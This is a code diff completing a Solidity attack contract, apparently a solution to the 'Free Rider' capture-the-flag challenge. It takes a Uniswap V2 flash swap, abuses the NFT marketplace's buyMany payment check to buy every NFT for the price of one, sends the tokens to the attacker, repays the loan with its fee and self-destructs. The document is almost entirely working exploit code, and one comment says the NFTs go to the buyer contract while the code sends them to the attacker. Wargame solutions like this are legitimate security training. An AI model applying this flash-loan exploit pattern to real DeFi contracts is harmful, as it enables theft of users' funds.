@@ -107,13 +107,15 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
     IWETH immutable weth;
     IERC721 immutable nft;
     address freeRiderBuyer;
-    uint256 nftPrice;
+    uint8 immutable amountOfNFT;
+    uint256 immutable nftPrice;
 
     constructor(
         IUniswapV2Pair _uniswapPair,
         FreeRiderNFTMarketplace _nftMarketplace,
         IWETH _weth,
         address _freeRiderBuyer,
+        uint8 _amountOfNFT,
         uint256 _nftPrice
     ) {
         attacker = msg.sender;
@@ -122,6 +124,7 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         weth = _weth;
         nft = _nftMarketplace.token();
         freeRiderBuyer = _freeRiderBuyer;
+        amountOfNFT = _amountOfNFT;
         nftPrice = _nftPrice;
     }
 
@@ -138,11 +141,48 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         address,
         uint,
         uint,
-        bytes calldata
+        bytes calldata _data
     ) external override {
-        weth.withdraw(120 ether);
+        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
+
+        // computing for 0.3% fee
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+
+        // unwrap WETH
+        weth.withdraw(amount);
+
+        // 3. buy all the NFT from marketplace
+        uint256[] memory tokenIds = new uint256[](amountOfNFT);
+        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+        }
+        nftMarketplace.buyMany{value: nftPrice}(tokenIds);
+
+        // send all of the nft to the FreeRiderBuyer contract
+        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+            nft.safeTransferFrom(address(this), attacker, tokenId);
+        }
+
+        // wrap enough WETH9 to repay our debt
+        weth.deposit{value: amountToRepay}();
+
+        // 5. repay loan to uniswap
+        IERC20(tokenBorrow).transfer(address(uniswapPair), amountToRepay);
+
+        // selfdestruct to the owner
+        selfdestruct(payable(attacker));
     }
-    // 3. buy all the NFT
-    // 4. send to FreeRiderBuyer contract
-    // 5. repay loan to uniswap
+
+    receive() external payable {}
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
 }
